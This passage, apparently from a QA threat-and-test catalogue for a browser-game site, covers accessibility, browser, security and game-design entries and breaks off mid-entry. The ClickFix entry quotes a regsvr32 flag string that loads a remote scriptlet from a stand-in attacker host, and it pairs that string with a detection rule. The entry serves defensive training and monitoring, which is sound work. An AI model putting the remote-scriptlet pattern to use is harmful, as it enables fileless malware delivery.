- [A-042] **[P3]** The W3C Web Accessibility Initiative published the **WCAG 2.2 Level AAA Conformance** reference page (w3.org/WAI/WCAG2AAA-Conformance, last updated Feb 20 2026) which is the formal specification of the HIGHEST accessibility tier — beyond AA (the legal minimum in US/EU/Japan) and A (the absolute floor). AAA conformance requires meeting all Level A, AA, AND AAA success criteria — including the AAA-only criteria like: **(1) 1.4.6 Contrast (Enhanced)** — text contrast ratio ≥ 7:1 (vs 4.5:1 for AA); **(2) 1.4.7 Low or No Background Audio** — any background audio must be at least 20dB below the foreground speech; **(3) 1.4.8 Visual Presentation** — user can override text size/spacing/font/color; **(4) 2.2.4 Interruptions** — user can postpone or suppress non-emergency interruptions; **(5) 2.3.2 Three Flashes** — ZERO flashing > 3 times per second (vs 3/s threshold at AA); **(6) 2.2.3 No Timing** — no time limits AT ALL; **(7) 3.2.5 Change on Request** — no automatic context changes; **(8) 3.3.5 Help: Error Prevention (All)** — user can reverse/verify/correct ANY submission. **Why this is the WCAG-2.2-AAA-CONFORMANCE-PREMIUM-TIER dimension distinct from A-002 (WCAG 2.2 color contrast AA — minimum 4.5:1)**: A-002 is the AA floor; A-042 is the AAA ceiling (7:1 contrast). **Distinct from A-007 (WCAG 3.0 Working Draft — future spec)**: A-007 is the next major version; A-042 is the current WCAG 2.2 AAA tier. **Distinct from A-027 (WCAG 2.2 87 success criteria 9 new EAA specifics — generic AA-tier coverage)**: A-027 is AA-level new-criteria summary; A-042 is AAA-tier highest-strictness subset. **Why this matters for GameZipper**: (a) GameZipper's standard games can target AA (legal minimum, broad device compatibility), but FEATURED games (the homepage hero slot, the editor's-pick games, the premium-tier puzzle games) should target AAA to differentiate from competitor sites — "the only AAA-accessible casual game site" is a marketable claim; (b) the AAA contrast 7:1 ratio requires careful palette design — GameZipper's existing dark-blue-on-yellow palette (default theme) likely already meets AAA on body text but may fail on subtle UI hints (subtle gray text on white); (c) the AAA "no timing" criterion (2.2.3) is incompatible with most arcade games (which inherently have time limits) — so AAA applies only to puzzle / card / turn-based / sandbox genres, not arcade; (d) the AAA "Three Flashes" (2.3.2) is stricter than the AA "Three Flashes or Below Threshold" (2.3.1) — any GameZipper game with a strobe effect (e.g., a damage-flash, a lightning effect) must be reduced to ZERO strobing for AAA (the AA threshold of 3 flashes/sec is still risky for some photosensitive users); (e) accessibility lawsuits in 2026 are increasingly citing AAA-conformance-fail as evidence of "knew-or-should-have-known" (cross-reference A-034/A-035/A-038/A-039 lawsuit-surge test cases). **Test**: (1) for each FEATURED game (homepage hero slot), run automated AAA-conformance audit via axe + WAVE + Lighthouse Accessibility (set target to "AAA" not "AA"); (2) manually verify AAA-only criteria: contrast 7:1 for ALL text including subtle hints; ZERO flashing > 3/s in any animation; NO timing limit anywhere (a featured puzzle game must not have a countdown timer); (3) verify "user can override text size/spacing/font/color" — does the game respect `prefers-color-scheme`, `prefers-reduced-transparency`, `font-size` user settings? Most browser games do NOT respect these today; (4) verify "user can postpone/suppress non-emergency interruptions" — does the game allow disabling mid-game ads, notification toasts, achievement popups? (AAA requires this); (5) document on the game page itself: "This game meets WCAG 2.2 Level AAA conformance — verified on YYYY-MM-DD" — this is a positive marketing signal AND a defense against future ADA-lawsuit claims. Source: https://www.w3.org/WAI/WCAG2AAA-Conformance (Feb 20 2026 — "Web pages with one of these logos claim conformance to WCAG 2.2 at Level AAA")

### 46.8 Hardware Eye-Protection Display Features — iQOO Neo11 2592Hz PWM + Circular Polarizer (Hardware Eye-Comfort Conflict)

- [A-043] **[P2]** The iQOO Neo11 (May 2026 flagship phone, so.html5.qq.com/page/real/search_news?docid=70000021_3686a19436b85752) introduces THREE hardware-level eye-protection features that fundamentally change how users perceive game visual output: **(1) 2592Hz high-frequency PWM dimming at full brightness** — vs traditional 240Hz PWM on most OLEDs, this 10× higher PWM frequency is below the threshold of human perception (which is ~2000Hz), eliminating visible PWM flicker that causes eye strain; **(2) Circular polarizer hardware eye-protection** — simulates natural light characteristics at the light-emitting-material level (圆偏振光硬件护眼) rather than adding a simple blue-light filter, reducing reflected-light glare; **(3) SVM (Stroboscopic Visibility Measure) value as low as 0.03** — IEEE 1789-2015 standard metric, where SVM < 1.0 is "low risk" and SVM < 0.1 is "essentially flicker-free"; the iQOO Neo11's SVM 0.03 is 33× better than the "low-risk" threshold. **Why this is the HARDWARE-EYE-PROTECTION-DISPLAY-CONFLICT dimension distinct from A-009 (dark mode mobile OLED best practices — software dimming)**: A-009 is software-side dark mode; A-043 is hardware-side eye-protection that the game cannot see but must not trigger. **Distinct from A-029 (WCAG 2.2 SC 3.3.9 Accessible Authentication No-Learning — authentication dimension)**: A-029 is authentication UX; A-043 is display hardware. **Distinct from A-042 (WCAG 2.2 AAA — formal accessibility spec)**: A-042 is a spec tier; A-043 is hardware-feature-impact-on-game-design. **Why this matters for GameZipper**: (a) the hardware eye-protection features are GREAT for users (less eye strain → longer sessions → more ad impressions) but they create a NEW DESIGN CONSTRAINT: aggressive visual effects that game developers historically used to draw attention (rapid flashing, high-contrast strobing, neon-glow pulses) may CONFLICT with the hardware's eye-comfort mode — on a 2592Hz PWM panel with SVM 0.03, a game that flashes at 60Hz will be PERCEPTIBLY strobing relative to the panel's baseline (vs imperceptible on a 240Hz PWM panel where everything strobes); (b) the circular polarizer reduces reflected glare — meaning game scenes with high specular highlights (water reflections, metal surfaces, glass effects) will look DIFFERENT on iQOO Neo11 vs traditional OLED; (c) long-session games (idle games, sandbox games, card-collection games where users play 30+ minutes) benefit most from the hardware eye-protection — but if the game has a "damage flash" or "level-up strobe" pattern, the cumulative eye-strain from 30 minutes of strobing on a "flicker-free" panel may be MORE noticeable than on a traditional flickering panel (because user expectation is "this panel shouldn't flicker"); (d) by end of 2026, all major Android flagships will have similar hardware eye-protection (Samsung "Vision Booster" + 2592Hz PWM, Pixel "Low Blue Light Pro", Xiaomi "Sunlight Display Pro") — making this a baseline 2026-2027 user expectation. **Test**: (1) for any Top 30 game with strobe/flash effects (damage flash, level-up strobe, victory fireworks), reduce the strobe rate to < 3Hz (3 flashes per second) per WCAG 2.3.1 + respect `prefers-reduced-motion` (CSS) / `prefers-reduced-transparency`; (2) on an iQOO Neo11 device, play a game with strobe effects for 60 seconds in a dim room — verify the strobing is not perceptibly eye-straining relative to the panel's 2592Hz PWM baseline; (3) for games with high specular highlights (water/metal/glass), verify visual output on circular-polarizer displays — the highlights may look "softer" or "less mirror-like" than on non-polarizer OLED; this is EXPECTED and game art should not be tuned for non-polarizer panels exclusively; (4) add a "Reduce Visual Effects" toggle to game settings (cross-reference W-114 dark-mode-as-default) that, when ON, disables all strobe/flash effects — this satisfies both WCAG 2.3.1 AA AND adapts to hardware eye-protection expectations; (5) for long-session games (>5 min average session), add a periodic "Eye comfort reminder" every 20 minutes (the 20-20-20 rule) — this is a positive UX signal AND defends against future eye-strain-related lawsuits. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_3686a19436b85752 (May 29 2026 — "2026游戏手机推荐:屏幕定义体验,技术重塑标准" + "圆偏振光硬件护眼技术,是从发光材料层面模拟自然光特性,而非简单添加滤蓝光膜" + "配合2592Hz全亮度高频PWM调光,SVM值低至0.03,让长时间游戏后的视觉疲劳感显著降低")



---

## CATEGORY 47: 2026 LATE-JUNE CROSS-VENDOR-IDENTITY + CLICKFIX-LOLBIN-EVOLUTION + CLICKFIX-TERMINAL-VARIANT + APPLE-FIRST-SILENT-UPDATE-DEPLOYMENT + XOR-RANSOMWARE + PLAYWRIGHT-CROSS-BROWSER-METHODOLOGY + OFFICE-WORKER-FRAGMENTED-SESSION (R204 — Dynamic Test Intelligence)

### 47.1 Microsoft Edge Google Account Login Support (July 2026 Rollout) — Cross-Vendor Identity Provider Federation

- [W-189] **[P2]** On June 18 2026, Microsoft announced that **Microsoft Edge will formally support Google account sign-in starting July 2026** (so.html5.qq.com/page/real/search_news?docid=70000021_0076a33a7fb08452). This is a major strategic shift to accelerate Chrome→Edge user migration: users who have all their bookmarks/history/passwords/cookies in their Google account can now sign into Edge with that same Google account and have all the data sync over. Strategically Microsoft is willing to federate identity with a direct competitor (Google) to grow Edge market share. **Why this is the CROSS-VENDOR-IDENTITY-PROVIDER-FEDERATION dimension distinct from W-125 (Edge 148 AI sidebar — single-vendor AI feature)**: W-125 covers an Edge AI feature; W-189 covers the new ability of a Microsoft browser to authenticate against the Google identity provider. **Distinct from W-152 (Edge 149 Collections/Sidebar removal — feature removal)**: W-152 is feature deprecation; W-189 is new identity federation. **Distinct from S-064 (Device Bound Session Credentials Chrome 146 — single-vendor cookie binding)**: S-064 is Chrome-only session credential binding; W-189 is cross-vendor account federation. **Distinct from B-094 (Edge Custom Primary Password removed June 4 2026)**: B-094 covers a removal of a Microsoft-master-password feature; W-189 is the addition of a Google-as-IdP feature. **Why this matters for GameZipper**: (a) GameZipper ad-platform logins (AdSense, Monetag, Cloudflare dashboard) are typically Google OAuth — once Edge accepts Google sign-in, team members using Edge for the first time may inadvertently create a NEW Edge-managed Google session that lacks the team's prior 2FA / device-trust context, giving an attacker who phishes a Google credential a NEW browser surface to exploit; (b) cross-vendor session token exchange between Microsoft and Google infrastructure is a high-value target — any breach of the federation handshake (token replay, ID-token sub claim confusion) affects every Edge-signed-in-with-Google user; (c) the federation handoff happens via a redirect chain (Edge → accounts.google.com → back to Edge with token) that is itself a redirect-URL-validation attack surface; (d) QA test matrix must now include Edge-with-Google-account as a distinct auth-context row in addition to Chrome-with-Google-account, Edge-with-Microsoft-account, Firefox-with-Google-account, Safari-with-Google-account; (e) regression-test that any GameZipper feature relying on browser-identity (Service Worker registration scope tied to origin AND signed-in user, Push API subscription tied to browser-vendor account) behaves identically across Edge-Google vs Chrome-Google. **Test**: (1) confirm that signing into Edge with a Google account does NOT auto-sign-into Google services on `gamezipper.com` without explicit per-origin consent; (2) test that signing out of Edge does NOT leave residual Google cookies in the Edge profile that could be hijacked by a malicious site; (3) verify the redirect chain during the Edge↔Google federation handshake is HTTPS end-to-end with no downgrades; (4) regression-test any GameZipper feature that uses `Identity Provider API` (Federated Credential Management) for cross-origin sign-in — the new Edge-Google flow may bypass FedCM and use direct cookie injection instead; (5) monitor Edge release notes through July 2026 for the actual ship date and any last-minute scope reduction. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_0076a33a7fb08452

### 47.2 ClickFix Attack Variant Using cmdkey + regsvr32 Fileless LOLBINs (April 29 2026)

- [S-169] **[P1]** On April 29 2026, cybersecurity researchers documented a **more powerful new variant of the ClickFix attack** that operates differently from prior versions (so.html5.qq.com/page/real/search_news?docid=70000021_95169f1600f36952). Instead of relying on PowerShell (which is heavily monitored by EDR solutions and Windows Defender), the new variant **chains two Windows-native built-in tools — `cmdkey` and `regsvr32`** — to silently drop remote payloads without writing any files to disk. **Mechanism**: the attacker tricks the user (via a fake "fix this error" / "verify you are human" / "install codec" web page) into pasting a short command into Win+R or a terminal; the command uses `cmdkey` (Windows credential backup tool, signed by Microsoft) to dump credentials to a network share, then `regsvr32` (COM DLL registration tool, signed by Microsoft, with `/s /u /i:http://attacker/script.sct` flag) to execute remote scriptlet code that downloads and runs the actual payload in memory. Both tools are legitimate Microsoft-signed binaries — they bypass any allowlist that trusts MS-signed binaries, and they leave no `.exe`/`.dll`/`.ps1` file on disk for forensic analysis. **Why this is the SOCIAL-ENGINEERING-LOLBIN-FILELESS-BYPASS dimension distinct from S-123 (ClickFix Win+R PowerShell self-typed execution — single-tool PowerShell)**: S-123 uses PowerShell directly (heavily monitored); S-169 chains two LOLBINs (Living Off The Land Binaries) that bypass PowerShell-centric detection. **Distinct from S-122 (fake browser-update phishing with clipboard/Win+R PowerShell)**: S-122 is clipboard-then-PowerShell; S-169 is clipboard-then-cmdkey+regsvr32. **Distinct from S-101 (AI assistant browser extension zero-click prompt injection)**: S-101 is browser-extension vector; S-169 is social-engineering-paste vector. **Distinct from C-109 (Apifox desktop-client CDN poisoning)**: C-109 is a dev-tool supply chain; S-169 is end-user-targeted social engineering. **Why this matters for GameZipper**: (a) ClickFix attacks routinely target CASUAL GAME players via fake "you need to install our codec to play" / "click here to fix the loading error" overlays — and GameZipper's games sometimes display such loading-error states; an attacker can clone the GameZipper visual style in a phishing page and serve a ClickFix prompt; (b) any GameZipper user who runs the malicious paste command compromises their entire browser session (cookies, localStorage, saved passwords, including the GameZipper session cookie and any saved AdSense/Monetag admin credentials); (c) EDR cannot catch this variant because both LOLBINs are signed Microsoft binaries; (d) the fileless nature means post-incident forensics will find no malware artifact on disk — only Windows Event Log entries for `cmdkey` and `regsvr32` invocation; (e) GameZipper team members are also targets — a fake "GameZipper ad-platform login needs verification" ClickFix page could compromise team production credentials. **Test**: (1) verify GameZipper's on-page error UI never asks the user to "run a command" or "open a terminal" or "paste this code" — all legitimate GameZipper fixes must be in-browser actions (click button, refresh page); (2) train team on the cmdkey+regsvr32 ClickFix variant — they should treat any unexpected Win+R / Terminal paste prompt as malicious; (3) deploy Windows Event Log monitoring for unexpected `regsvr32 /i:http://...` invocations on team endpoints; (4) regression-test that the GameZipper "Something went wrong" toast (the existing recovery toast pattern) only ever offers an in-browser "Refresh" button, never an OS-level command; (5) for future GameZipper features that legitimately need a helper-app installation (e.g., desktop notifications), always use the OS-native installer flow (ClickOnce on Windows, .dmg on macOS, .deb on Linux) rather than asking users to paste a command. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_95169f1600f36952

### 47.3 ClickFix Windows Terminal Paste-and-Run Variant with Lumma Credential Stealer (Microsoft Threat-Intel, March 9 2026)

- [S-170] **[P1]** Per a Microsoft Threat Intelligence report covered March 9 2026 (so.html5.qq.com/page/real/search_news?docid=70000021_09969ae48f822052), a **new ClickFix variant surfaced in February 2026** that tricked Windows users into opening **Windows Terminal** and **pasting malicious software code** themselves, allowing the **Lumma credential-stealing trojan** to directly access the user's browser password vault. The new variant is an adjustment of the traditional ClickFix attack to **evade existing detection mechanisms** — by targeting Windows Terminal (a Microsoft Store app aimed at developers and power users) rather than the Win+R Run dialog or PowerShell directly. **Why this is the SOCIAL-ENGINEERING-TERMINAL-PASTE-EXECUTION dimension distinct from S-123 (Win+R PowerShell self-typed)**: S-123 uses Win+R; S-170 uses Windows Terminal, a separate app with its own paste UX. **Distinct from S-169 (cmdkey+regsvr32 fileless LOLBINs)**: S-169 chains two LOLBINs without writing files; S-170 uses paste-and-run in Windows Terminal which typically executes PowerShell/cmd with full shell semantics. **Distinct from S-122 (fake browser-update phishing with Win+R PowerShell)**: S-122 uses Win+R; S-170 uses Windows Terminal. **Distinct from S-156 (Vim modeline default-config arbitrary command execution)**: S-156 is a developer-tool (Vim) attack vector; S-170 is a Microsoft-built general-purpose Terminal app. **Why this matters for GameZipper**: (a) GameZipper's target demographic includes Windows power users who have Windows Terminal installed (the default installed-on-new-Windows-11-22H2+ behavior); these users are accustomed to paste-and-run workflows in their terminals, making them more vulnerable to ClickFix Terminal-paste attacks; (b) the Lumma stealer specifically targets **browser password vaults** — once a GameZipper user's Chrome/Edge password vault is exfiltrated, any saved GameZipper / AdSense / Monetag / Cloudflare / GitHub credentials are compromised; (c) the February-2026 attack timeframe means GameZipper team members may have been exposed to phishing pages mimicking legitimate GameZipper / Google / Microsoft login flows before Microsoft published the threat-intel report on March 9; (d) Windows Terminal as a vector is NOT covered by most enterprise EDR policies which focus on PowerShell Event ID 4104 (Script Block Logging) — Windows Terminal executes commands via ConPTY which has different event coverage. **Test**: (1) audit GameZipper team endpoints for Windows Terminal version — verify all are on a version with the latest security patches; (2) train team on the Terminal-paste variant — never paste code from a web page into Windows Terminal, even from "official-looking" sites; (3) deploy Windows Terminal Event Log monitoring for unexpected command execution originating from paste events; (4) enforce browser-password-manager master passwords + multi-device-verification (e.g., Chrome Sync encryption passphrase) so that even if Lumma exfiltrates the local vault, the credentials are useless without the secondary decryption key; (5) regression-test that GameZipper never displays code snippets with instructions like "paste this in your terminal" — all legitimate GameZipper developer/debug instructions should reference copy-to-clipboard buttons that produce sanitized commands. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_09969ae48f822052

### 47.4 Apple First-Ever Production Deployment of Background Silent (Rapid Security Response) WebKit Update — March 20 2026 (CVE-2026-20643)

- [B-120] **[P2]** On March 20 2026, Apple published the **first ever BACKGROUND SECURITY UPDATE** that fixed a newly discovered vulnerability **CVE-2026-20643** in WebKit, affecting Apple's entire product ecosystem — iPhones, iPads, Macs, and laptops (so.html5.qq.com/page/real/search_news?docid=70000021_65569bcad1337152). CVE-2026-20643 was discovered by security researcher **Thomas Espach** and specifically affects the WebKit browser engine's **navigation API** — by exploiting this vulnerability, **malicious web content can access data from another website** (cross-origin data leakage), violating the same-origin policy that is the foundational security boundary of every web browser. Per Jamf Senior Enterprise Strategy Manager Adam Boynton: "WebKit is the underlying technology powering Safari and other browsers on iOS. The CVE-2026-20643 vulnerability specifically affects the same-origin policy, which prevents one website from accessing another's personal information. Through this vulnerability, malicious web content can access data from another site." **Why this is the SILENT-UPDATE-MECHANISM-FIRST-PRODUCTION-USE dimension distinct from S-095 (Apple background Rapid Security Response capability announcement)**: S-095 covered Apple's announcement of the Rapid Security Response mechanism as a CAPABILITY; B-120 documents the **first ever actual production deployment** of that mechanism at scale — proving the silent-update pipeline works for real CVEs and silently changes Safari WebKit version UNDER users mid-session without any user interaction, app-store update, or even Settings.app notification. **Distinct from S-040 / S-150 (CVE-2026-28962 Safari 26.5 WebKit CSP bypass — different CVE)**: S-040/S-150 are specific CVEs; B-120 is about the silent-update MECHANISM used to deliver a CVE fix. **Distinct from B-097 (iOS 26.5 full security advisory 80+ vulns — full advisory)**: B-097 is a full-version-update advisory; B-120 is a silent background hotfix. **Distinct from B-098 (Apple retroactive months-old security-fix disclosure pattern)**: B-098 is disclosure-timing; B-120 is silent-update-delivery-mechanism. **Why this matters for GameZipper**: (a) **silent mid-session WebKit version change breaks the QA "test on this exact Safari version" assumption** — a user who started a GameZipper session on Safari 26.5 may have their WebKit version silently bumped to 26.5.1 (Rapid Security Response) WITHOUT closing their tab, meaning the browser they end the session on is NOT the browser they started on; (b) the cross-origin data leak in CVE-2026-20643 means an attacker who can plant malicious web content (e.g., a malicious ad creative served through Monetag/AdSense) can read data from OTHER open tabs — including the GameZipper game tab's localStorage (saved game state, gzFavs, recently-played history); (c) silent background updates bypass any user-controlled "wait to update" behavior — there is no way for a user to defer a Rapid Security Response; (d) the silent-update mechanism itself is a new attack surface — if Apple's signing key for Rapid Security Responses is ever compromised, attackers can silently push a malicious WebKit to ALL Apple devices simultaneously; (e) GameZipper QA test matrix must now distinguish between "user-initiated Safari update" (regular version bumps) and "silent Rapid Security Response" (which may change behavior without version-number change visible in `navigator.userAgent`). **Test**: (1) verify GameZipper pages still function correctly on Safari 26.5.x (the version that received the first Rapid Security Response) — re-test all Top-30 games on this exact version; (2) test that localStorage isolation is intact — a malicious ad iframe on a game page should NOT be able to read game-page localStorage post-RSR; (3) regression-test the GameZipper error-toast pattern (which fires when a third-party script errors) on a Safari that has just received a silent RSR — the RSR may change WebKit behavior in subtle ways that trigger new error patterns; (4) monitor GameZipper production analytics for any sudden spike in Safari-specific errors on March 20 2026 + 7 days (the silent-update rollout window); (5) document in QA procedures that Safari version verification must use BOTH `navigator.userAgent` AND the new `_RapidSecurityResponse` indicator (where exposed) — silent RSRs may not appear in the userAgent string. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_65569bcad1337152

### 47.5 .xor Ransomware Family 2026 — Consumer-Endpoint Attack Chain Analysis (May 14 2026)

- [S-171] **[P2]** A May 14 2026 deep-dive article (so.html5.qq.com/page/real/search_news?docid=70000021_8016a05efd112652) analyzed the **.xor ransomware family** as one of the most active 2026 ransomware families targeting consumer endpoints (home PCs, individual users' machines). The article traces the full attack chain: initial access (typically via malicious game crack / cheat / mod download, or fake "free game key" landing pages, or compromised game-mod repository on GitHub), privilege escalation, lateral movement, payload deployment (file encryption with `.xor` extension), and ransom demand. **Why this is the CONSUMER-ENDPOINT-RANSOMWARE-FAMILY-TTP-2026 dimension distinct from past ransomware entries (S-087 / Canvas LMS ShinyHunters — different attack surface, education sector)**: S-087 is a server-side supply-chain attack on an education platform; S-171 is a client-side consumer-endpoint attack via game downloads. **Distinct from S-142 (AMD FFmpeg AI-slop patches supply-chain — developer ecosystem)**: S-142 is developer-targeted; S-171 is consumer-end-user targeted. **Distinct from S-158 (CVE-2026-0755 gemini-mcp-tool RCE — dev tool)**: S-158 is a developer MCP tool; S-171 is end-user game downloads. **Why this matters for GameZipper**: (a) GameZipper's target demographic — casual game players who download free games, browser extensions, and game mods — is the EXACT demographic targeted by .xor and similar 2026 ransomware families; (b) although GameZipper itself serves only browser games (no downloads), its users may associate "free game" with "free download" and fall for malicious landing pages that mimic GameZipper's visual style; (c) the .xor family uses game-themed lures (fake "GameZipper Premium unlocker", "free Monetag ad-free mod", "GameZipper cheat for top scores") which directly trade on the GameZipper brand trust; (d) once a user's machine is encrypted by .xor, the attacker may also exfiltrate browser data before encryption — including the GameZipper session cookie and any saved credentials; (e) for team endpoints, the .xor family is a real risk if any team member runs game-mod testing or "research downloads" of suspicious game-related executables. **Test**: (1) train team: never download "GameZipper" branded executables from third-party sites — GameZipper is browser-only and ships zero native binaries; (2) deploy EDR on all team endpoints that flags any `.xor` file extension being created; (3) monitor GameZipper brand-mention channels (Reddit, gaming forums, search engines) for fake "GameZipper download" landing pages and submit takedown requests; (4) regression-test that the GameZipper homepage clearly states "100% browser-based, no downloads" to reinforce the brand-trust message; (5) for future GameZipper features that legitimately distribute downloads (e.g., a desktop PWA installer via GitHub Releases), enforce code-signing + reproducible builds so that any unsigned "GameZipper installer" found in the wild is immediately identifiable as malicious. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_8016a05efd112652

### 47.6 Playwright Cross-Browser (Chromium + Firefox + WebKit) Parallel Testing Methodology Baseline — Tencent Cloud June 22 2026

- [C-124] **[P3]** A June 22 2026 Tencent Cloud guide (cloud.tencent.com/developer/article/2609141 "Playwright实践指南:Chrome、Firefox和Safari跨浏览器测试详解") documents the **gold-standard cross-browser parallel testing methodology** using Playwright: install Playwright with `npm install playwright` followed by `npx playwright install` which automatically downloads Chromium, Firefox, AND WebKit browser binaries (note: Playwright's "WebKit" build is patched to behave like Safari, providing Safari-equivalent test coverage on Linux/Windows without needing macOS hardware); then iterate over `{chromium, firefox, webkit}` browser instances in a single test script, executing the same test logic against all three engines. **Why this is the PLAYWRIGHT-CROSS-BROWSER-QA-METHODOLOGY-BASELINE dimension distinct from C-078 (Playwright 1.61 AI agents — single-browser AI mode)**: C-078 is single-browser AI; C-124 is the explicit three-browser parallel matrix. **Distinct from C-081 (Playwright CLI AI agent — single-browser CLI)**: C-081 is single-browser; C-124 is three-browser. **Distinct from C-087 (Playwright MCP accessibility-tree-first — single-browser accessibility)**: C-087 is single-browser a11y; C-124 is cross-browser methodology. **Distinct from C-096 (Playwright Test Agents — single-browser self-healing)**: C-096 is single-browser self-healing; C-124 is cross-browser parallel coverage. **Distinct from C-101 (Multi-registry CI/CD scanner coverage gap — supply-chain scanning)**: C-101 is dependency scanning; C-124 is runtime browser testing. **Why this matters for GameZipper**: (a) GameZipper's current QA pipeline tests primarily in Chromium (via Kachilu / internal browser_navigate); Firefox and Safari/WebKit test coverage is largely manual / ad-hoc, leaving 30%+ of real-user browser engines (Firefox ~5% + Safari ~25%) under-tested in automated regression; (b) Playwright's WebKit build means GameZipper can now run Safari-equivalent tests in CI on a Linux build agent without macOS hardware — closing the Safari-coverage gap that previously required manual macOS testing; (c) the three-browser parallel pattern catches engine-specific bugs (Blink-only vs WebKit-only vs Gecko-only rendering divergence) early — for example, a `box-shadow on display:table-row` bug that previously required a separate Safari-27 sweep (W-145) would be caught automatically; (d) cross-browser parallel testing is the foundation for any future GameZipper migration to a new web platform feature (WebGPU, View Transitions API, CSS Gap Decorations) where engine support timing differs; (e) the methodology aligns with the WCAG 2.2 AA cross-browser accessibility audit requirement (A-027) — accessibility bugs are often engine-specific (e.g., screen-reader-only behavior differs between VoiceOver/Safari and NVDA/Firefox). **Test**: (1) stand up a Playwright three-browser parallel test runner in GameZipper CI that runs the Top-30 game smoke-test against chromium + firefox + webkit on every commit; (2) capture per-engine baseline screenshots for visual regression comparison; (3) for any new web-platform feature adopted (e.g., the HTML-in-Canvas API from C-095), add a three-engine smoke test that verifies the feature works in all three or degrades gracefully; (4) integrate Playwright cross-browser test results into the post-deploy-verification Phase 4 step (currently Chromium-only) so that Safari and Firefox regressions are caught before production ship; (5) document the test runner setup in the QA runbook so that future GameZipper engineers can reproduce the three-browser matrix on a fresh CI agent. Source: https://cloud.tencent.com/developer/article/2609141

### 47.7 2026 Office-Worker Fragmented-Session Casual Game Design Pattern (June 10 2026 上班族手游 Research)

- [G-152] **[P3]** A June 10 2026 industry article (so.html5.qq.com/page/real/search_news?docid=70000021_8716a2902b367452 "2026上班族适合的手游:碎片时间下班解压选择") documents the rising 2026 design pattern of casual games **specifically designed for office workers' fragmented time** — 5-minute work-break sessions, commute-time play, lunch-break entertainment. The article identifies the key design constraints: (1) **"上手难度"** (low barrier to entry) — a brand-new player must be playing within 3 taps of opening the game; (2) **"回归便捷性"** (convenient return) — a returning player who has not played for days/weeks must be able to resume instantly without re-learning controls or being overwhelmed by UI changes; (3) **"互动趣味性"** (interactive fun) — the gameplay loop must complete within a 5-minute window with a satisfying win/lose/progress moment; (4) **subconscious pause-and-resume** — the game must auto-pause on any OS-level interruption (incoming call, calendar notification, app switch) and auto-resume from the exact pre-interruption state without losing progress. **Why this is the FRAGMENTED-SESSION-OFFICE-WORKER-CASUAL-DESIGN-PATTERN dimension distinct from G-099 (zero-download instant play UX — instant-first-play benchmark)**: G-099 covers first-play latency; G-152 covers session-resume after arbitrary interruptions. **Distinct from G-100 (FTUE <3 tap onboarding benchmark — first-session onboarding)**: G-100 is first-session onboarding; G-152 is multi-session return-onboarding. **Distinct from G-105 (casual game tutorial UX less-than-3-step — tutorial design)**: G-105 is tutorial design; G-152 is interruption-recovery design. **Distinct from G-113 (casual game content treadmill weekly update cadence — content cadence)**: G-113 is content-cadence; G-152 is session-resume-cadence. **Distinct from G-145 (2026 mobile-game retention benchmarks with hyper-casual 48h-lapse threshold — retention metric)**: G-145 is a retention-metric; G-152 is a design-pattern that affects retention. **Why this matters for GameZipper**: (a) the GameZipper target demographic includes office workers playing during work breaks — these users will close the tab abruptly when a meeting starts, then return 1-2 hours later expecting to resume the SAME game at the SAME state; (b) the current GameZipper pattern of saving game state to localStorage on specific game-end events (game over, level complete) is INSUFFICIENT — it loses progress for any game interrupted mid-level by tab-close; (c) the office-worker pattern requires SUB-SECOND state-preservation across arbitrary interruption points — every meaningful game state change (move a piece, place a block, collect a coin) should be persisted to localStorage or IndexedDB within one animation frame; (d) on resume, the game should restore to the exact pre-interruption state including animation positions, sound queues, and pending timeouts — not just the high-level "current level"; (e) the design pattern also requires graceful handling of stale state — if a user returns to a saved game after a GameZipper platform update changed the game's level format, the saved state must auto-detect incompatibility and offer "restart from level 1" rather than crashing. **Test**: (1) for each Top-30 GameZipper game, interrupt the game mid-action (close tab) and verify the resume restores to within 1 second of the pre-close state; (2) measure state-persistence latency — every meaningful game action should be saved within 1 animation frame (16ms at 60fps); (3) test stale-state handling — manually edit a saved-game-state JSON to simulate a future-game-version format, then verify the game detects the incompatibility and offers graceful restart; (4) test that returning to a GameZipper game after a 7-day absence does not show a "you have been away" full-screen modal that blocks immediate play (office workers expect zero-friction return); (5) regression-test that the existing `visibilitychange` handler pattern in games (which pauses the game when tab is hidden) correctly auto-resumes on `visibilitychange` to visible without requiring user click — this is the office-worker's most common resume pattern (switch back to the game tab from another app). Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_8716a2902b367452



---

## CATEGORY 48: 2026 LATE-JUNE SAFARI-26.4-REGRESSION-SWEEP + IOS-WEBKIT-ENGINE-MONOPOLY-PENALTY + CHROME-149-CSS-GAP-DECORATIONS + CHROME-148-HTTP3 + AI-DRIVEN-ATTACK + BROWSER-FINGERPRINTING-EVOLUTION + CANVAS-DIRTY-RECT-OPTIMIZATION + BCD-COMPATIBILITY-TRACKING + CHROMEOS-148-CERT-MIGRATION + POKI-ADAPTIVE-LAYOUT (R205 — Dynamic Test Intelligence)

### 48.1 Safari 26.4 WebKit Regression Sweep — 191 Bugs Fixed + 44 New Features + 1 Feature Deprecation (March 24 2026)

- [B-121] **[P1]** Apple's WebKit blog announced Safari 26.4 on March 24 2026 (so.html5.qq.com/page/real/search_news?docid=70000021_17369c3312871752) as a major WebKit release shipping **44 new features, 191 bug fixes, and 1 feature deprecation**. At this scale of change, Safari 26.4 is functionally a new browser engine, not an incremental update. **Why this is the SAFARI-26.4-MAJOR-RELEASE-REGRESSION-SWEEP dimension distinct from B-013 (Safari 26.4 WebTransport — single-feature note)**: B-013 covers ONE feature (WebTransport); B-121 covers the FULL 191-bug + 44-feature release as a regression sweep target. **Distinct from B-119 (iOS 26 broad bug regression — OS-level bugs)**: B-119 is OS-level native-app bugs; B-121 is browser-engine-level bugs fixed in 26.4. **Distinct from B-120 (Apple first-ever silent Rapid Security Response — update mechanism)**: B-120 is the delivery mechanism; B-121 is the user-initiated major-version release. **Why this matters for GameZipper**: (a) with 191 bug fixes, behaviors that GameZipper games DEPENDED on (e.g., a WebKit canvas rendering quirk that produced visually-correct output by accident) may now render DIFFERENTLY — the "bug" Apple fixed may have been load-bearing for some game's visual output; (b) the 44 new features include new CSS/JS APIs that GameZipper games may want to adopt, but feature-detection must verify the feature is actually available in 26.4+ (not just claimed); (c) the 1 deprecated feature may be something a GameZipper game still uses — deprecation means it still works in 26.4 but will be REMOVED in a future version; (d) Safari represents ~25% of GameZipper traffic, so a Safari 26.4 regression that 